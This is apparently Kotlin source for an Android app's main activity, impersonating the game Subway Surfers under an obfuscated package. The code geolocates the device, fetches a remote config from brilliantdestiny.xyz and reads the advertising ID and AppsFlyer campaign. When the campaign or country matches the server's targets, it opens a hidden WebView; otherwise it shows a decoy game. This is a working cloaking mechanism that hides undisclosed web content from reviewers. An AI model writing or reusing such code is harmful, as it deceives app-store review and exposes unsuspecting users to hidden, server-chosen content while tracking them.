package com.kiloo.subwaysurfr

import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.kiloo.subwaysurfr.GooodClass.Companion.C1hhhhh
import com.kiloo.subwaysurfr.GooodClass.Companion.ghyhplyplhy
import com.kiloo.subwaysurfr.GooodClass.Companion.gtghyhyhy
import com.kiloo.subwaysurfr.GooodClass.Companion.rfrgtgttt
import com.kiloo.subwaysurfr.databinding.ActivityMainBinding
import com.kiloo.subwaysurfr.databinding.ActivityVeeeebVievBinding
import com.kiloo.subwaysurfr.gimi.GameGameActivity
import com.orhanobut.hawk.Hawk
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {
    lateinit var bobobob: ActivityMainBinding

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)


        bobobob = ActivityMainBinding.inflate(layoutInflater)
        setContentView(bobobob.root)
        GlobalScope.launch(Dispatchers.IO) {
            kpkpkpkp
        }

        AppsFlyerLib.getInstance()
            .init("KZQPgvXscUGon9aEQnZKj9", kikolollo, applicationContext)
        AppsFlyerLib.getInstance().start(this)

    }

    private fun dadadadad(){
        val gtgtgtgt = AdvertisingIdClient(applicationContext)
        gtgtgtgt.start()
        val adIdInfo = gtgtgtgt.info.id
        Hawk.put(gtghyhyhy, adIdInfo)
    }


    private suspend fun gtggtgtgt(): String? {
        val retrofitBuilder = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://pro.ip-api.com/")
            .build()
            .create(ApiInterfaceeeee::class.java)

        val kokokokok = retrofitBuilder.getData().body()?.countryCode
        return kokokokok

    }


    private suspend fun kpkpkpkpk(): String? {
        val retroBuildTwo = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://brilliantdestiny.xyz/")
            .build()
            .create(ApiInterfaceeeee::class.java)

        val lkoklkokl = retroBuildTwo.getDataDev().body()?.view
        val ghyyhyhy = retroBuildTwo.getDataDev().body()?.appsChecker
        Hawk.put(ghyhplyplhy, ghyyhyhy)
        Hawk.put(rfrgtgttt, lkoklkokl)
        val retroData = retroBuildTwo.getDataDev().body()?.geo
        return retroData
    }

    private val kpkpkpkp: Job = GlobalScope.launch(Dispatchers.IO) {
        val hyhjyjhyji: String = gtggtgtgt().toString()
        val gtgtggt = kpkpkpkpk().toString()
        var juujuuju: String? = Hawk.get(C1hhhhh)
        val dedede: String? = Hawk.get(ghyhplyplhy)


        dadadadad()
        if (dedede == "1") {
            val vfvf = Executors.newSingleThreadScheduledExecutor()
            vfvf.scheduleAtFixedRate({
                if (juujuuju != null) {
                    if (juujuuju!!.contains("tdb2") || gtgtggt.contains(hyhjyjhyji)) {
                        vfvf.shutdown()
                        startActivity(Intent(this@MainActivity, VeeeebVievActivity::class.java))
                        finish()
                    } else {
                        vfvf.shutdown()
                        startActivity(Intent(this@MainActivity, GameGameActivity::class.java))
                        finish()
                    }
                } else {
                    juujuuju =  Hawk.get(C1hhhhh)
                }

            }, 0, 2, TimeUnit.SECONDS)
        }
        else if (gtgtggt.contains(hyhjyjhyji)) {
            startActivity(Intent(this@MainActivity, VeeeebVievActivity::class.java))
            finish()
        } else {
            startActivity(Intent(this@MainActivity, GameGameActivity::class.java))
            finish()
        }
    }

    private val kikolollo = object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
            val dataGotten = data?.get("campaign").toString()
            Hawk.put(C1hhhhh, dataGotten)
        }

        override fun onConversionDataFail(p0: String?) {
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {

        }

        override fun onAttributionFailure(p0: String?) {
        }
    }
}


